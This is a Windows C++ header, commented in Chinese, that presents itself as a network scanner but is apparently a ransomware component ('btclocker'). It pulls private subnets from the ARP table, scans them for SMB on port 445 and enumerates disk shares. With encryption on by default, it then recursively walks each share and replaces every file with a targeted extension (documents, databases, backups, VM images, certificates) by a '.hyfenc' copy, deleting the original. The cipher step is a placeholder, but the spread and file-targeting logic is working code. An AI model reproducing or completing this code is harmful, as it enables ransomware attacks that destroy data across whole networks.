#pragma once

// 防止头文件重复包含
#ifndef NETWORK_SCANNER_H
#define NETWORK_SCANNER_H

// 系统头文件
#define WIN32_LEAN_AND_MEAN
#define _WINSOCKAPI_
#define NOMINMAX
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <ws2ipdef.h>
#include <iphlpapi.h>
#include <icmpapi.h>
#include <MSWSock.h>

// 网络共享头文件
#include <lmshare.h>
#include <lm.h>
#include <winnetwk.h>
#include <shlwapi.h>

// 加密相关头文件
#include <wincrypt.h>
#include <bcrypt.h>

// 标准库头文件
#include <queue>
#include <thread>
#include <mutex>
#include <condition_variable>
#include <atomic>
#include <memory>
#include <vector>
#include <string>
#include <iostream>
#include <filesystem>
#include <iomanip>
#include <chrono>
#include <sstream>

// 链接库
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "mswsock.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "Bcrypt.lib")

namespace network_scanner {
    namespace fs = std::filesystem;

    // 结构体定义
    struct share_info_ {
        std::wstring sharePath;
    };
    typedef share_info_ SHARE_INFO, * PSHARE_INFO;

    struct subnet_info_ {
        ULONG dwAddress;
    };
    typedef subnet_info_ SUBNET_INFO, * PSUBNET_INFO;

    struct host_info_ {
        ULONG dwAddress;
        std::wstring wszAddress;
    };
    typedef host_info_ HOST_INFO, * PHOST_INFO;

    struct connect_context_ {
        OVERLAPPED Overlapped;
        SOCKET s;
        DWORD dwAddress;
        BYTE State;
    };
    typedef connect_context_ CONNECT_CONTEXT, * PCONNECT_CONTEXT;

    // 完成键枚举
    enum COMPLETION_KEYS {
        START_COMPLETION_KEY = 1,
        CONNECT_COMPLETION_KEY = 2,
        TIMER_COMPLETION_KEY = 3
    };

    // 使用常量定义状态
    constexpr int CONNECTED = 0;
    constexpr int CONNECTING = 1;
    constexpr int NOT_CONNECTED = 2;

    constexpr int SMB_PORT = 445;
    constexpr ULONG STOP_MARKER = 0xFFFFFFFF;

    // 加密常量
    constexpr int KEY_LENGTH = 32;

    // 全局变量声明
    extern LPFN_CONNECTEX g_ConnectEx;
    extern std::mutex g_CriticalSection;
    extern std::vector<std::unique_ptr<SUBNET_INFO>> g_SubnetList;
    extern std::vector<std::unique_ptr<HOST_INFO>> g_HostList;
    extern std::vector<std::unique_ptr<CONNECT_CONTEXT>> g_ConnectionList;
    extern HANDLE g_IocpHandle;
    extern std::atomic<LONG> g_ActiveOperations;
    extern struct hostent* g_HostEntry;
    extern BYTE g_encryptionKey[KEY_LENGTH];
    extern std::atomic<bool> g_encryptionEnabled;
    extern std::vector<std::wstring> g_targetExtensions;

    // 输出反馈相关变量
    extern std::atomic<long> g_ScannedHosts;
    extern std::atomic<long> g_FoundShares;
    extern std::atomic<long> g_EncryptedFiles;
    extern std::atomic<bool> g_ScanningActive;
    extern std::atomic<long> g_TotalFilesProcessed;

    // 函数声明
    DWORD GetCurrentIpAddress();
    BOOL GetConnectEx();
    BOOL GetSubnets();
    VOID EnumShares(const std::wstring& pwszIpAddress, std::vector<std::unique_ptr<SHARE_INFO>>& ShareList);
    DWORD WINAPI HostHandler(PVOID pArg);
    BOOL AddHost(DWORD dwAddress);
    BOOL CreateHostTable();
    VOID ScanHosts();
    BOOL CompleteAsyncConnect(SOCKET s);
    VOID WINAPI TimerCallback(PVOID Arg, BOOLEAN TimerOrWaitFired);
    DWORD WINAPI PortScanHandler(PVOID pArg);
    void GenerateEncryptionKey();
    bool ShouldEncryptFile(const std::wstring& filePath);
    void EncryptSharedFiles(const std::wstring& sharePath);
    void PrintProgress(const std::wstring& message, bool isError = false);
    void PrintScanSummary();
    DWORD WINAPI ProgressMonitor(PVOID pArg);
    VOID StartScan(bool enableEncryption = true);

    // 全局变量定义
    LPFN_CONNECTEX g_ConnectEx = nullptr;
    std::mutex g_CriticalSection;
    std::vector<std::unique_ptr<SUBNET_INFO>> g_SubnetList;
    std::vector<std::unique_ptr<HOST_INFO>> g_HostList;
    std::vector<std::unique_ptr<CONNECT_CONTEXT>> g_ConnectionList;
    HANDLE g_IocpHandle = NULL;
    std::atomic<LONG> g_ActiveOperations{ 0 };
    struct hostent* g_HostEntry = nullptr;

    BYTE g_encryptionKey[KEY_LENGTH];
    std::atomic<bool> g_encryptionEnabled{ false };
    std::vector<std::wstring> g_targetExtensions = {
        L".doc", L".docx", L".xlsx", L".xls", L".pptx", L".pdf",
        L".mdf", L".ndf", L".bak", L".sqlite", L".db", L".ldf",
        L".qbb", L".qbo", L".ofx",
        L".javass", L".pys", L".jss", L".ymls", L".inis", L".envs",
        L".psd", L".ai", L".dwg", L".skp",
        L".vmdk", L".iso", L".pfx", L".pems",
        L".pst", L".mbox", L".mpp",
        L".jar", L".zip", L".tar.gz",
        L".pptx", L".ppt", L".jpg", L".png", L".txt", L".jpeg"
    };

    std::atomic<long> g_ScannedHosts{ 0 };
    std::atomic<long> g_FoundShares{ 0 };
    std::atomic<long> g_EncryptedFiles{ 0 };
    std::atomic<bool> g_ScanningActive{ false };
    std::atomic<long> g_TotalFilesProcessed{ 0 };

    // 函数实现
    void PrintProgress(const std::wstring& message, bool isError) {
        std::lock_guard<std::mutex> lock(g_CriticalSection);

        auto now = std::chrono::system_clock::now();
        auto time_t = std::chrono::system_clock::to_time_t(now);

        std::wcout << L"[" << std::put_time(std::localtime(&time_t), L"%H:%M:%S") << L"] ";

        if (isError) {
            std::wcout << L"❌ 错误: ";
        }
        else {
            std::wcout << L"🔍 ";
        }

        std::wcout << message << std::endl;
    }

    void PrintScanSummary() {
        std::wcout << L"\n";
        std::wcout << L"══════════════════════════════════════════════════" << std::endl;
        std::wcout << L"📊 扫描摘要报告" << std::endl;
        std::wcout << L"══════════════════════════════════════════════════" << std::endl;
        std::wcout << L"• 扫描主机数: " << g_ScannedHosts.load() << std::endl;
        std::wcout << L"• 发现共享数: " << g_FoundShares.load() << std::endl;
        std::wcout << L"• 加密文件数: " << g_EncryptedFiles.load() << std::endl;
        std::wcout << L"• 处理文件总数: " << g_TotalFilesProcessed.load() << std::endl;
        std::wcout << L"══════════════════════════════════════════════════" << std::endl;
    }

    DWORD WINAPI ProgressMonitor(PVOID pArg) {
        while (g_ScanningActive) {
            std::this_thread::sleep_for(std::chrono::seconds(2));

            std::wstringstream progressMsg;
            progressMsg << L"📈 扫描进度 - 主机: " << g_ScannedHosts.load()
                << L" | 共享: " << g_FoundShares.load()
                << L" | 文件: " << g_EncryptedFiles.load()
                << L" | 活动操作: " << g_ActiveOperations.load();
            PrintProgress(progressMsg.str());
        }
        return 0;
    }

    DWORD GetCurrentIpAddress() {
        PrintProgress(L"获取本机IP地址...");

        CHAR szHostName[256];
        if (gethostname(szHostName, sizeof(szHostName))) {
            PrintProgress(L"获取主机名失败", true);
            return 0;
        }

        g_HostEntry = gethostbyname(szHostName);

        if (g_HostEntry) {
            std::wstringstream ss;
            ss << L"本机主机名: " << szHostName;
            PrintProgress(ss.str());
        }

        return g_HostEntry ? 0 : 1;
    }

    BOOL GetConnectEx() {
        PrintProgress(L"获取ConnectEx函数指针...");

        DWORD dwBytes;
        int rc;

        SOCKET sock = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
        if (sock == INVALID_SOCKET) {
            PrintProgress(L"创建Socket失败", true);
            return FALSE;
        }

        GUID guid = WSAID_CONNECTEX;
        rc = WSAIoctl(sock, SIO_GET_EXTENSION_FUNCTION_POINTER,
            &guid, sizeof(guid),
            &g_ConnectEx, sizeof(g_ConnectEx),
            &dwBytes, NULL, NULL);

        closesocket(sock);

        if (rc == 0) {
            PrintProgress(L"ConnectEx函数获取成功");
        }
        else {
            PrintProgress(L"ConnectEx函数获取失败", true);
        }

        return rc == 0;
    }

    BOOL GetSubnets() {
        PrintProgress(L"开始获取子网信息...");

        PMIB_IPNETTABLE pIpNetTable = NULL;
        DWORD dwSize = 0;
        DWORD dwRetVal;

        // 获取ARP表大小
        dwRetVal = GetIpNetTable(pIpNetTable, &dwSize, FALSE);
        if (dwRetVal != ERROR_INSUFFICIENT_BUFFER) {
            PrintProgress(L"获取ARP表大小失败", true);
            return FALSE;
        }

        // 分配内存
        pIpNetTable = (PMIB_IPNETTABLE)malloc(dwSize);
        if (!pIpNetTable) {
            PrintProgress(L"分配内存失败", true);
            return FALSE;
        }

        // 获取ARP表
        dwRetVal = GetIpNetTable(pIpNetTable, &dwSize, FALSE);
        if (dwRetVal != NO_ERROR) {
            PrintProgress(L"获取ARP表失败", true);
            free(pIpNetTable);
            return FALSE;
        }

        // 遍历ARP表
        for (DWORD i = 0; i < pIpNetTable->dwNumEntries; i++) {
            DWORD dwAddress = pIpNetTable->table[i].dwAddr;
            IN_ADDR addr;
            addr.S_un.S_addr = dwAddress;
            char* szIp = inet_ntoa(addr);
            std::string ipStr(szIp);

            // 检查是否为私有地址
            if (ipStr.find("172.") == 0 ||
                ipStr.find("192.168.") == 0 ||
                ipStr.find("10.") == 0 ||
                ipStr.find("169.254.") == 0) {

                BOOL found = FALSE;
                // 检查是否已在子网列表中
                for (const auto& subnet : g_SubnetList) {
                    if ((subnet->dwAddress & 0xFFFFFF00) == (dwAddress & 0xFFFFFF00)) {
                        found = TRUE;
                        break;
                    }
                }

                if (!found) {
                    auto newSubnet = std::make_unique<SUBNET_INFO>();
                    newSubnet->dwAddress = dwAddress & 0xFFFFFF00; // 网络部分
                    g_SubnetList.push_back(std::move(newSubnet));

                    std::wstringstream ss;
                    ss << L"发现子网: " << szIp;
                    PrintProgress(ss.str());
                }
            }
        }

        free(pIpNetTable);

        if (g_SubnetList.empty()) {
            PrintProgress(L"未找到可用的子网", true);
            return FALSE;
        }

        std::wstringstream ss;
        ss << L"发现 " << g_SubnetList.size() << L" 个子网";
        PrintProgress(ss.str());

        return TRUE;
    }

    VOID EnumShares(const std::wstring& pwszIpAddress, std::vector<std::unique_ptr<SHARE_INFO>>& ShareList) {
        std::wstringstream startMsg;
        startMsg << L"扫描主机 " << pwszIpAddress << L" 的共享资源";
        PrintProgress(startMsg.str());

        LPSHARE_INFO_1 pShareInfo = NULL;
        DWORD entriesRead = 0, totalEntries = 0, resumeHandle = 0;
        NET_API_STATUS status;

        do {
            status = NetShareEnum(
                const_cast<LPWSTR>(pwszIpAddress.c_str()),
                1,
                (LPBYTE*)&pShareInfo,
                MAX_PREFERRED_LENGTH,
                &entriesRead,
                &totalEntries,
                &resumeHandle
            );

            if (status == ERROR_SUCCESS || status == ERROR_MORE_DATA) {
                for (DWORD i = 0; i < entriesRead; i++) {
                    if (pShareInfo[i].shi1_type == STYPE_DISKTREE) {
                        auto share = std::make_unique<SHARE_INFO>();
                        share->sharePath = L"\\\\" + pwszIpAddress + L"\\" + pShareInfo[i].shi1_netname;
                        ShareList.push_back(std::move(share));

                        std::wstringstream shareMsg;
                        shareMsg << L"    📁 发现共享: " << pShareInfo[i].shi1_netname;
                        PrintProgress(shareMsg.str());

                        // 如果启用加密，加密共享文件
                        if (g_encryptionEnabled) {
                            EncryptSharedFiles(share->sharePath);
                        }
                    }
                }

                if (pShareInfo) {
                    NetApiBufferFree(pShareInfo);
                    pShareInfo = NULL;
                }
            }
        } while (status == ERROR_MORE_DATA);

        if (ShareList.empty()) {
            std::wstringstream noShareMsg;
            noShareMsg << L"主机 " << pwszIpAddress << L" 未发现可用的磁盘共享";
            PrintProgress(noShareMsg.str());
        }
        else {
            std::wstringstream shareMsg;
            shareMsg << L"主机 " << pwszIpAddress << L" 发现 " << ShareList.size() << L" 个共享";
            PrintProgress(shareMsg.str());
            g_FoundShares += ShareList.size();
        }
    }

    DWORD WINAPI HostHandler(PVOID pArg) {
        std::vector<std::unique_ptr<SHARE_INFO>> ShareList;

        while (true) {
            std::unique_ptr<HOST_INFO> hostInfo;

            {
                std::lock_guard<std::mutex> lock(g_CriticalSection);
                if (g_HostList.empty()) {
                    Sleep(1000);
                    continue;
                }

                hostInfo = std::move(g_HostList.front());
                g_HostList.erase(g_HostList.begin());
            }

            if (hostInfo->dwAddress == STOP_MARKER) {
                break;
            }

            EnumShares(hostInfo->wszAddress, ShareList);
            ShareList.clear();
        }

        return 0;
    }

    BOOL AddHost(DWORD dwAddress) {
        // 排除本地地址
        if (g_HostEntry) {
            for (int i = 0; g_HostEntry->h_addr_list[i] != NULL; i++) {
                DWORD currentAddr = *reinterpret_cast<DWORD*>(g_HostEntry->h_addr_list[i]);
                if (currentAddr == dwAddress) {
                    return FALSE;
                }
            }
        }

        auto hostInfo = std::make_unique<HOST_INFO>();
        hostInfo->dwAddress = dwAddress;

        if (dwAddress != STOP_MARKER) {
            sockaddr_in sa;
            sa.sin_addr.s_addr = dwAddress;
            sa.sin_family = AF_INET;

            wchar_t ipStr[INET_ADDRSTRLEN];
            DWORD ipStrLen = INET_ADDRSTRLEN;

            if (WSAAddressToStringW(reinterpret_cast<SOCKADDR*>(&sa), sizeof(sa), NULL, ipStr, &ipStrLen) == 0) {
                hostInfo->wszAddress = ipStr;

                std::wstringstream ss;
                ss << L"✅ 发现活动主机: " << ipStr;
                PrintProgress(ss.str());
            }
            else {
                return FALSE;
            }
        }

        {
            std::lock_guard<std::mutex> lock(g_CriticalSection);
            g_HostList.push_back(std::move(hostInfo));
            g_ScannedHosts++;
        }

        return TRUE;
    }

    BOOL CreateHostTable() {
        if (g_SubnetList.empty()) {
            return FALSE;
        }

        auto subnet = std::move(g_SubnetList.front());
        g_SubnetList.erase(g_SubnetList.begin());

        BYTE network[4];
        memcpy(network, &subnet->dwAddress, 4);

        for (int i = 1; i < 255; i++) {
            network[3] = i;
            DWORD hostAddr;
            memcpy(&hostAddr, network, 4);

            auto ctx = std::make_unique<CONNECT_CONTEXT>();
            ZeroMemory(ctx.get(), sizeof(CONNECT_CONTEXT));

            ctx->s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, WSA_FLAG_OVERLAPPED);
            if (ctx->s == INVALID_SOCKET) {
                continue;
            }

            sockaddr_in localAddr;
            ZeroMemory(&localAddr, sizeof(localAddr));
            localAddr.sin_family = AF_INET;
            localAddr.sin_addr.s_addr = INADDR_ANY;

            if (bind(ctx->s, reinterpret_cast<SOCKADDR*>(&localAddr), sizeof(localAddr)) == SOCKET_ERROR) {
                closesocket(ctx->s);
                continue;
            }

            if (CreateIoCompletionPort(reinterpret_cast<HANDLE>(ctx->s), g_IocpHandle, CONNECT_COMPLETION_KEY, 0) == NULL) {
                closesocket(ctx->s);
                continue;
            }

            ctx->dwAddress = hostAddr;
            ctx->State = NOT_CONNECTED;

            g_ConnectionList.push_back(std::move(ctx));
        }

        return TRUE;
    }

    VOID ScanHosts() {
        PrintProgress(L"开始端口扫描...");

        int totalHosts = g_ConnectionList.size();
        int currentHost = 0;

        for (auto& ctx : g_ConnectionList) {
            currentHost++;

            sockaddr_in targetAddr;
            ZeroMemory(&targetAddr, sizeof(targetAddr));
            targetAddr.sin_family = AF_INET;
            targetAddr.sin_port = htons(SMB_PORT);
            targetAddr.sin_addr.s_addr = ctx->dwAddress;

            if (g_ConnectEx(ctx->s, reinterpret_cast<SOCKADDR*>(&targetAddr), sizeof(targetAddr),
                NULL, 0, NULL, &ctx->Overlapped)) {
                ctx->State = CONNECTED;
                AddHost(ctx->dwAddress);
            }
            else if (WSAGetLastError() == WSA_IO_PENDING) {
                ctx->State = CONNECTING;
                g_ActiveOperations++;

                std::wstringstream connectingMsg;
                connectingMsg << L"🔄 扫描主机 [" << currentHost << "/" << totalHosts << "]...";
                PrintProgress(connectingMsg.str());
            }
        }
    }

    BOOL CompleteAsyncConnect(SOCKET s) {
        int optval;
        int optlen = sizeof(optval);

        if (setsockopt(s, SOL_SOCKET, SO_UPDATE_CONNECT_CONTEXT, NULL, 0) != 0) {
            return FALSE;
        }

        if (getsockopt(s, SOL_SOCKET, SO_CONNECT_TIME, reinterpret_cast<char*>(&optval), &optlen) != 0) {
            return FALSE;
        }

        return optval != -1;
    }

    VOID WINAPI TimerCallback(PVOID Arg, BOOLEAN TimerOrWaitFired) {
        PostQueuedCompletionStatus(g_IocpHandle, 0, TIMER_COMPLETION_KEY, NULL);
    }

    DWORD WINAPI PortScanHandler(PVOID pArg) {
        HANDLE hTimerQueue = CreateTimerQueue();
        HANDLE hTimer = NULL;
        BOOL timerActive = FALSE;

        while (true) {
            DWORD bytesTransferred;
            ULONG_PTR completionKey;
            OVERLAPPED* pOverlapped;

            BOOL success = GetQueuedCompletionStatus(g_IocpHandle, &bytesTransferred, &completionKey, &pOverlapped, INFINITE);

            // 检查是否为定时器触发
            if (completionKey == TIMER_COMPLETION_KEY) {
                timerActive = FALSE;

                if (g_ActiveOperations > 0) {
                    for (auto& connection : g_ConnectionList) {
                        if (connection->State == CONNECTING) {
                            CancelIo(reinterpret_cast<HANDLE>(connection->s));
                        }
                    }
                }
                else {
                    g_ConnectionList.clear();

                    if (!CreateHostTable()) {
                        break;
                    }

                    ScanHosts();

                    if (!CreateTimerQueueTimer(&hTimer, hTimerQueue, TimerCallback, NULL, 30000, 0, WT_EXECUTEINTIMERTHREAD)) {
                        break;
                    }

                    timerActive = TRUE;
                }
                continue;
            }

            // 处理连接完成
            auto ctx = reinterpret_cast<PCONNECT_CONTEXT>(pOverlapped);
            if (!ctx) {
                continue;
            }

            if (completionKey == START_COMPLETION_KEY) {
                if (!CreateHostTable()) {
                    break;
                }

                ScanHosts();

                if (!CreateTimerQueueTimer(&hTimer, hTimerQueue, TimerCallback, NULL, 30000, 0, WT_EXECUTEINTIMERTHREAD)) {
                    break;
                }

                timerActive = TRUE;
            }
            else if (completionKey == CONNECT_COMPLETION_KEY) {
                g_ActiveOperations--;

                if (success && CompleteAsyncConnect(ctx->s)) {
                    ctx->State = CONNECTED;
                    AddHost(ctx->dwAddress);
                }
                else {
                    ctx->State = NOT_CONNECTED;
                }

                if (g_ActiveOperations == 0 && timerActive) {
                    g_ConnectionList.clear();

                    if (!CreateHostTable()) {
                        break;
                    }

                    ScanHosts();

                    if (!CreateTimerQueueTimer(&hTimer, hTimerQueue, TimerCallback, NULL, 30000, 0, WT_EXECUTEINTIMERTHREAD)) {
                        break;
                    }

                    timerActive = TRUE;
                }
            }
        }

        if (hTimerQueue) {
            DeleteTimerQueueEx(hTimerQueue, INVALID_HANDLE_VALUE);
        }

        return 0;
    }

    void GenerateEncryptionKey() {
        HCRYPTPROV hProv;
        if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
            CryptGenRandom(hProv, KEY_LENGTH, g_encryptionKey);
            CryptReleaseContext(hProv, 0);

            // 保存密钥到文档目录（示例）
            WCHAR docPath[MAX_PATH];
            if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_MYDOCUMENTS, NULL, 0, docPath))) {
                std::wstring keyPath = std::wstring(docPath) + L"\\btclocker_key.bin";
                HANDLE hFile = CreateFileW(keyPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                if (hFile != INVALID_HANDLE_VALUE) {
                    DWORD bytesWritten;
                    WriteFile(hFile, g_encryptionKey, KEY_LENGTH, &bytesWritten, NULL);
                    CloseHandle(hFile);

                    std::wstringstream ss;
                    ss << L"加密密钥已保存到: " << keyPath;
                    PrintProgress(ss.str());
                }
            }

            PrintProgress(L"加密密钥已生成");
        }
        else {
            PrintProgress(L"加密密钥生成失败", true);
        }
    }

    bool ShouldEncryptFile(const std::wstring& filePath) {
        size_t dotPos = filePath.find_last_of(L'.');
        if (dotPos == std::wstring::npos) {
            return false;
        }

        std::wstring extension = filePath.substr(dotPos);
        std::transform(extension.begin(), extension.end(), extension.begin(), ::towlower);

        for (const auto& targetExt : g_targetExtensions) {
            if (extension == targetExt) {
                return true;
            }
        }

        return false;
    }

    void EncryptSharedFiles(const std::wstring& sharePath) {
        std::wstringstream startMsg;
        startMsg << L"开始加密共享: " << sharePath;
        PrintProgress(startMsg.str());

        try {
            int fileCount = 0;
            for (const auto& entry : fs::recursive_directory_iterator(sharePath)) {
                if (entry.is_regular_file()) {
                    std::wstring filePath = entry.path().wstring();
                    g_TotalFilesProcessed++;

                    if (ShouldEncryptFile(filePath)) {
                        fileCount++;
                        std::wstringstream encryptMsg;
                        encryptMsg << L"    🔒 加密文件 [" << fileCount << L"]: " << entry.path().filename().wstring();
                        PrintProgress(encryptMsg.str());

                        // 这里应该是实际的加密操作
                        // 示例：重命名文件表示已加密
                        std::wstring encryptedPath = filePath + L".hyfenc";

                        try {
                            fs::copy_file(filePath, encryptedPath, fs::copy_options::overwrite_existing);
                            fs::remove(filePath);

                            g_EncryptedFiles++;
                            std::wstringstream successMsg;
                            successMsg << L"        ✅ 加密完成: " << entry.path().filename().wstring();
                            PrintProgress(successMsg.str());
                        }
                        catch (const std::exception& e) {
                            std::wstringstream errorMsg;
                            errorMsg << L"        ❌ 加密失败: " << entry.path().filename().wstring();
                            PrintProgress(errorMsg.str(), true);
                        }
                    }
                }
            }

            std::wstringstream summaryMsg;
            summaryMsg << L"共享 " << sharePath << L" 加密完成，共处理 " << fileCount << L" 个文件";
            PrintProgress(summaryMsg.str());

        }
        catch (const std::exception& e) {
            std::wstringstream errorMsg;
            errorMsg << L"访问共享时出错: " << sharePath << L" - " << e.what();
            PrintProgress(errorMsg.str(), true);
        }
    }

    VOID StartScan(bool enableEncryption) {
        // 初始化计数器
        g_ScannedHosts = 0;
        g_FoundShares = 0;
        g_EncryptedFiles = 0;
        g_TotalFilesProcessed = 0;
        g_ScanningActive = true;

        std::wcout << L"🚀 开始网络扫描任务" << std::endl;
        std::wcout << L"══════════════════════════════════════════════════" << std::endl;

        auto startTime = std::chrono::system_clock::now();

        if (enableEncryption) {
            PrintProgress(L"加密功能已启用");
        }
        else {
            PrintProgress(L"加密功能已禁用");
        }

        // 创建进度监视线程
        HANDLE hProgressThread = CreateThread(NULL, 0, ProgressMonitor, NULL, 0, NULL);

        WSADATA wsaData;
        HANDLE hHostThread = NULL;
        HANDLE hPortScanThread = NULL;

        // 初始化加密
        g_encryptionEnabled = enableEncryption;
        if (enableEncryption) {
            GenerateEncryptionKey();
        }

        // 初始化Winsock
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            PrintProgress(L"WSAStartup失败", true);
            g_ScanningActive = false;
            return;
        }

        // 获取ConnectEx函数指针
        if (!GetConnectEx()) {
            WSACleanup();
            g_ScanningActive = false;
            return;
        }

        // 获取子网信息
        if (!GetSubnets()) {
            WSACleanup();
            g_ScanningActive = false;
            return;
        }

        // 创建IOCP句柄
        g_IocpHandle = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, 0);
        if (g_IocpHandle == NULL) {
            PrintProgress(L"创建IOCP句柄失败", true);
            WSACleanup();
            g_ScanningActive = false;
            return;
        }

        // 创建主机处理线程
        hHostThread = CreateThread(NULL, 0, HostHandler, NULL, 0, NULL);
        if (hHostThread == NULL) {
            PrintProgress(L"创建主机处理线程失败", true);
            CloseHandle(g_IocpHandle);
            WSACleanup();
            g_ScanningActive = false;
            return;
        }

        // 创建端口扫描线程
        hPortScanThread = CreateThread(NULL, 0, PortScanHandler, NULL, 0, NULL);
        if (hPortScanThread == NULL) {
            PrintProgress(L"创建端口扫描线程失败", true);
            TerminateThread(hHostThread, 0);
            CloseHandle(hHostThread);
            CloseHandle(g_IocpHandle);
            WSACleanup();
            g_ScanningActive = false;
            return;
        }

        PrintProgress(L"所有线程启动完成，开始扫描...");

        // 发送开始信号
        PostQueuedCompletionStatus(g_IocpHandle, 0, START_COMPLETION_KEY, NULL);

        // 等待线程结束
        WaitForSingleObject(hHostThread, INFINITE);
        WaitForSingleObject(hPortScanThread, INFINITE);

        // 清理资源
        CloseHandle(hHostThread);
        CloseHandle(hPortScanThread);
        CloseHandle(g_IocpHandle);
        WSACleanup();

        g_ScanningActive = false;
        WaitForSingleObject(hProgressThread, INFINITE);
        CloseHandle(hProgressThread);

        auto endTime = std::chrono::system_clock::now();
        auto duration = std::chrono::duration_cast<std::chrono::seconds>(endTime - startTime);

        std::wstringstream timeMsg;
        timeMsg << L"扫描完成，总耗时: " << duration.count() << L" 秒";
        PrintProgress(timeMsg.str());

        PrintScanSummary();
    }

} // namespace network_scanner

#endif // NETWORK_SCANNER_H